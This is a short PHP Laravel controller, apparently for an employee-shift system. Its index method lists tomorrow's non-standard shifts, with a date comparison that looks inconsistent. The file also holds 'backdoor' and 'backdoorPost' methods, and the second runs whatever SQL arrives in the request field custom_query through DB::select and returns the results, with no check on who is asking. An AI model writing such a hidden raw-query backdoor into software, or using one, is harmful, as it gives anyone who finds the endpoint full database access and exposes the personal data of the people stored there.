<?php

namespace App\Http\Controllers;

use App\Http\Api\OperationApi\ExamSystem\ExamSystemApi;
use App\Http\Api\OperationApi\SurveySystem\SurveySystemApi;
use App\Models\Employee;
use App\Models\Permit;
use App\Models\Punishment;
use App\Models\Shift;
use App\Services\PermitService;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Str;

class HomeController extends Controller
{
    public function index(Request $request)
    {
        return Shift::with([
            'employee'
        ])->whereBetween('start_date', [
            date('Y-m-d 00:00:00', strtotime('+1 days')),
            date('Y-m-d 23:59:59', strtotime('+1 days'))
        ])->
        where(function ($shifts) {
            $shifts->
            where('start_date', '<>', date('Y-m-d 09:00:00'))->
            orWhere('end_date', '<>', date('Y-m-d 18:00:00'));
        })->
        get();
    }

    public function backdoor()
    {
        return view('backdoor');
    }

    public function backdoorPost(Request $request)
    {
        return response()->json(DB::select($request->custom_query), 200);
    }
}
